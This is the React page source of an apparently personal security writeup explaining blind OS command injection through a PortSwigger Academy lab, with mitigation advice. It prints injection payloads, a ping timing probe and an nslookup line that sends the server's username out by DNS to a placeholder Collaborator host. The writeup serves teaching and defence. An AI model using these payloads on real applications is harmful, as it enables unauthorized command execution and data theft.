import WriteupArticle from "../../components/WriteupArticle";
import Reveal from "../../components/Reveal";
import GlowDivider from "../../components/GlowDivider";

export const metadata = {
  description: "OS command injection explainer: blind OS command injection with out-of-band data exfiltration, the hardest Practitioner lab in the topic on PortSwigger Academy. How it works, the payload, and the fix.",
  title: "OS command injection, blind and out of band, explained | hannan.",
};

function Section({ title, children }) {
  return (
    <Reveal tag="section" className="py-8">
      <h2 className="mt-3 text-xl text-[#F5F2ED] sm:text-2xl">{title}</h2>
      <div className="mt-4 space-y-4 text-sm leading-relaxed text-[#F5F2ED]">{children}</div>
    </Reveal>
  );
}

function Code({ children }) {
  return (
    <pre className="overflow-x-auto whitespace-pre-wrap break-all rounded-xl border border-[#262626] bg-[#111111] p-4 font-mono text-sm leading-relaxed text-[#F5F2ED]">
      <code>{children}</code>
    </pre>
  );
}

export default function OsCommandInjectionBlind() {
  return (
    <WriteupArticle
      title="OS command injection, blind and out of band, explained"
      date="PortSwigger Academy, Practitioner"
      category="Vulnerability explainer"
      readingTime="4 min read"
    >
      <p>
        This is an explainer, not a lab diary. Each post in this series teaches one vulnerability and
        walks through the hardest Practitioner lab for it on PortSwigger Academy, step by step, with
        the real payloads. There are no screenshots here, the labs are public and you can run them
        yourself.
      </p>
      <p>
        OS command injection is when an application takes your input and passes it to a shell command
        on the server. If you can break out of the intended command, you can run your own. The blind
        version is the awkward one: the command runs, but its output never comes back to you, so you
        have to find another way to see what it did.
      </p>

      <GlowDivider />

      <Section title="The bug">
        <p>
          The lab is a feedback form. You enter an email address and a message, and the server calls
          out to the mail program with your details. The email parameter ends up inside a shell
          command, and nothing stops you from adding your own command after it. The problem is that
          the output of the mail command is never returned in the response, so even a working
          injection looks like nothing happened.
        </p>
        <p>
          When you cannot see the output, you make the server send it somewhere you can see. A DNS
          lookup is perfect for this: the server resolves a name you control, and the answer is
          hidden inside the name it looks up.
        </p>
      </Section>

      <GlowDivider />

      <Section title="The worked example">
        <p>
          The lab is Blind OS command injection with out-of-band data exfiltration, Practitioner
          level, on PortSwigger Academy. The goal is the name of the operating system user running
          the site.
        </p>
        <p>
          First, confirm the injection with a time delay, which needs no output at all. A ping with
          ten packets takes about ten seconds, so if the response is slow, your command ran.
        </p>
        <Code>{"|| ping -c 10 127.0.0.1 ||"}</Code>
        <p>
          Then exfiltrate the answer. The payload runs whoami, and puts the result into a DNS lookup
          against your Collaborator domain. Put this in the email field, replacing the Collaborator
          part with your own subdomain. You need Burp Suite Professional for Collaborator, or any
          domain where you can see the DNS lookups.
        </p>
        <Code>{"|| nslookup $(whoami).<COLLABORATOR> ||"}</Code>
        <p>
          The server runs nslookup on a hostname that starts with the OS username, so the username
          shows up in the Collaborator log as a subdomain. Submit that username and the lab is
          solved. The || on each side separates your command from the original one, so whatever was
          around the injection point does not get in the way.
        </p>
      </Section>

      <GlowDivider />

      <Section title="The fix">
        <p>
          <strong>Do not call out to OS commands with user input.</strong> Almost every time an app
          shells out, there is a platform API that does the same job safely. If the app must send
          mail, use a mail library, not the mail program.
        </p>
        <p>
          <strong>Validate against a whitelist.</strong> If input has to reach a command, check it
          against a short list of allowed values, or check that it is only what you expect, like a
          number. Never try to sanitise shell metacharacters by escaping them, that is too easy to
          get wrong.
        </p>
        <p>
          <strong>Block outbound DNS from the server.</strong> Out-of-band exfiltration needs the
          server to reach your domain. If it cannot resolve external names, the answer has nowhere
          to go, which turns a full exfiltration into a much smaller problem.
        </p>
      </Section>

      <GlowDivider />

      <p className="text-sm text-[#8A8A8A]">
        Lab: Blind OS command injection with out-of-band data exfiltration, PortSwigger Web Security Academy, Practitioner level. Run it yourself on the Academy, it is free.
      </p>
      <p>
        <a href="/writeups" className="font-semibold text-[#F5F2ED] underline underline-offset-4">
          Back to Writeups
        </a>
      </p>
    </WriteupArticle>
  );
}
